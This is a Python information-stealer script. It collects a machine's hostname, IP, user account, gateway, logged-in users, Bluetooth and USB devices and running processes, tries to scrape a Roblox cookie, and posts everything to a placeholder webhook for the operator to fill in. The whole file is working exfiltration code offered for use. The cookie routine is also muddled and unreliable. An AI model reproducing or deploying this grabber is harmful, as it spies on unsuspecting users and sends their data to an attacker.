import socket
import requests
import platform
import os
import getpass
import subprocess
from bs4 import BeautifulSoup
import re
import psutil
import win32com.client

def get_system_info():
    system_info = {
        "System": platform.system(),
        "Node Name": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor()
    }
    return system_info

def get_main_browser():
    if platform.system() == "Windows":
        browsers = [
            {"name": "Chrome", "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
            {"name": "Firefox", "path": "C:\\Program Files\\Mozilla Firefox\\firefox.exe"},
            {"name": "Edge", "path": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"},
        ]
    elif platform.system() == "Darwin":  # macOS
        browsers = [
            {"name": "Safari", "path": "/Applications/Safari.app/Contents/MacOS/Safari"},
            {"name": "Chrome", "path": "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"},
            {"name": "Firefox", "path": "/Applications/Firefox.app/Contents/MacOS/firefox"},
        ]
    else:  # Linux
        browsers = [
            {"name": "Chrome", "path": "/usr/bin/google-chrome"},
            {"name": "Firefox", "path": "/usr/bin/firefox"},
            {"name": "Chromium", "path": "/usr/bin/chromium-browser"},
        ]

    for browser in browsers:
        if os.path.exists(browser["path"]):
            return browser["name"]

    return "Unknown"

def get_account_name():
    if platform.system() == "Windows":
        return getpass.getuser()
    elif platform.system() == "Linux" or platform.system() == "Darwin":
        return os.getenv("USER")
    else:
        return "Unknown"

def get_default_gateway():
    try:
        if platform.system() == "Windows":
            output = subprocess.check_output("ipconfig", shell=True).decode()
            lines = output.split('\n')
            for line in lines:
                if "Default Gateway" in line:
                    return line.split(":")[1].strip()
        else:
            output = subprocess.check_output("ip route show | grep default", shell=True).decode()
            return output.split(" ")[2].strip()
    except Exception as e:
        print(f"Error while retrieving default gateway: {e}")
        return "Unknown"

def get_device_type(default_gateway):
    if default_gateway.startswith("192.168."):
        return "Router"
    elif default_gateway.startswith("10."):
        return "Router"
    elif default_gateway.startswith("172."):
        return "Router"
    else:
        return "Unknown"

def get_roblox_console_info():
    try:
        session = requests.Session()
        response = session.get("https://www.roblox.com/develop")
        response.raise_for_status()  
        soup = BeautifulSoup(response.text, 'html.parser')
        scripts = soup.find_all("script")
        for script in scripts:
            if "var USER_SEARCH_CLIENT_DATA" in script.text:
                user_search_data = script.text
                match = re.search(r'"clientApp\..*?"', user_search_data)
                if match:
                    roblox_info = match.group().strip('"')
                    if "cookies" in roblox_info.lower():
                        cookie_value_match = re.search(r'"_.*?"', roblox_info)
                        if cookie_value_match:
                            cookie_value = cookie_value_match.group().strip('"')
                            decoded_cookie = bytes.fromhex(cookie_value).decode('utf-8')
                            return decoded_cookie
                        else:
                            return "No cookie information found"
                    else:
                        return "No information found related to cookies"
        return "No information found"   
    except requests.RequestException as e:
        return f"Request error: {e}"
    except Exception as e:
        return f"Error: {e}"

def get_logged_in_users():
    try:
        users = []
        for user in psutil.users():
            users.append({"username": user.name, "terminal": user.terminal})
        print("Logging in:",)
        return users
    except Exception as e:
        print(f"Error while retrieving logged-in users: {e}")
        return []
def get_performance_info():
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent
    disk_usage = psutil.disk_usage('/').percent
    return {
        "CPU Usage (%)": cpu_usage,
        "Memory Usage (%)": memory_usage,
        "Disk Usage (%)": disk_usage
    }

def get_bluetooth_devices():
    devices = []
    if platform.system() == "Linux":
        try:
            output = subprocess.check_output("hcitool scan", shell=True).decode()
            lines = output.strip().split("\n")
            for line in lines[1:]:
                parts = line.split("\t")
                if len(parts) == 2:
                    devices.append({"name": parts[1], "mac_address": parts[0]})
        except Exception as e:
            print(f"Error while retrieving Bluetooth devices: {e}")
    elif platform.system() == "Darwin":
        try:
            output = subprocess.check_output("system_profiler SPBluetoothDataType", shell=True).decode()
            sections = output.split("Devices:")
            if len(sections) > 1:
                devices_section = sections[1]
                lines = devices_section.strip().split("\n")
                for line in lines:
                    if "Address:" in line:
                        mac_address = line.split("Address:")[1].strip()
                    elif "Product ID:" in line:
                        name = line.split("Product ID:")[1].strip()
                        devices.append({"name": name, "mac_address": mac_address})
        except Exception as e:
            print(f"Error while retrieving Bluetooth devices: {e}")
    return devices

def get_usb_devices():
    usb_devices = []
    try:
        if platform.system() == "Linux":
            output = subprocess.check_output("lsusb", shell=True).decode()
            lines = output.strip().split("\n")
            for line in lines:
                parts = line.split(" ")
                vendor_id, product_id = parts[5].split(":") if len(parts) > 5 else ("", "")
                manufacturer = " ".join(parts[6:8]) if len(parts) > 7 else ""
                product = " ".join(parts[8:]) if len(parts) > 8 else ""
                usb_devices.append({
                    "vendor_id": vendor_id,
                    "product_id": product_id,
                    "manufacturer": manufacturer,
                    "product": product
                })
        elif platform.system() == "Windows":
            output = subprocess.check_output("wmic path Win32_PnPEntity where \"Caption like '%USB%'\" get /value", shell=True).decode()
            devices_info = output.strip().split("\n\n")
            for device_info in devices_info:
                device = {}
                for line in device_info.split("\n"):
                    key_value = line.split("=", 1)
                    if len(key_value) == 2:
                        key, value = key_value
                        device[key.strip()] = value.strip()
                if 'DeviceID' in device:
                    device_id_parts = device['DeviceID'].split("\\")
                    for part in device_id_parts:
                        if 'VID' in part:
                            vendor_id = part.split("_")[1]
                            device['vendor_id'] = vendor_id
                        elif 'PID' in part:
                            product_id = part.split("_")[1]
                            device['product_id'] = product_id
                usb_devices.append(device)
    except Exception as e:
        print(f"Error while retrieving USB devices: {e}")
    return usb_devices

def get_running_apps():
    running_apps = []
    try:
        for process in psutil.process_iter(['pid', 'name', 'username', 'exe']):
            if process.info['username'] and process.info['exe']:
                running_apps.append(process.info['name'])
    except Exception as e:
        print(f"Error while retrieving running apps: {e}")
    return running_apps

def send_to_webhook(pc_name, ip, system_info, main_browser, account_name, default_gateway, device_type, roblox_info, logged_in_users, performance_info, bluetooth_devices):
    webhook_url = "ENTERYOURWEBHOOK"
    data = {
        "content": f"PC Name: {pc_name}\nIP Address: {ip}\nSystem Info: {system_info}\nMain Browser: {main_browser}\nAccount Name: {account_name}\nDefault Gateway: {default_gateway}\nDevice Type: {device_type}\nRoblox Console Info: {roblox_info}\nLogged-in Users: {logged_in_users}\nPerformance Info: {performance_info}\nBluetooth Devices: {bluetooth_devices}"
    }
    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code == 204:
            print("Loaded")
        else:
            print(f"Failed to Load. Status code: {response.status_code}")
            print("Response content:", response.content)
    except Exception as e:
        print(f"An error occurred: {e}")

def send_usb_devices_to_webhook(pc_name, usb_devices):
    webhook_url = "ENTERYOURWEBHOOK"
    data = {
        "content": f"PC Name: {pc_name}\nUSB Devices: {usb_devices}"
    }
    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code == 204:
            print("Loaded USB Devices")
        else:
            print(f"Failed to Load USB Devices. Status code: {response.status_code}")
            print("Response content:", response.content)
    except Exception as e:
        print(f"An error occurred while loading USB Devices: {e}")

def send_running_apps_to_webhook(pc_name, running_apps):
    webhook_url = "ENTERYOURWEBHOOK"
    running_apps_str = '\n'.join(running_apps[:10]) 
    if len(running_apps_str) > 2000:
        running_apps_str = running_apps_str[:1997] + "..." 
    data = {
        "content": f"PC Name: {pc_name}\nRunning Apps:\n{running_apps_str}"
    }
    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code == 204:
            print("Loaded Running Apps")
        else:
            print(f"Failed to Load Running Apps. Status code: {response.status_code}")
            print("Response content:", response.content)
    except Exception as e:
        print(f"An error occurred while loading Running Apps: {e}")

def main():
    hostname = socket.gethostname()
    pc_name = hostname
    myip = socket.gethostbyname(hostname)
    system_info = get_system_info()
    main_browser = get_main_browser()
    account_name = get_account_name()
    default_gateway = get_default_gateway()
    device_type = get_device_type(default_gateway)
    roblox_info = get_roblox_console_info()
    logged_in_users = get_logged_in_users()
    performance_info = get_performance_info()
    bluetooth_devices = get_bluetooth_devices()
    usb_devices = get_usb_devices()
    running_apps = get_running_apps()

    send_to_webhook(pc_name, myip, system_info, main_browser, account_name, default_gateway, device_type, roblox_info, logged_in_users, performance_info, bluetooth_devices)
    send_usb_devices_to_webhook(pc_name, usb_devices)
    send_running_apps_to_webhook(pc_name, running_apps)

if __name__ == "__main__":
    main()
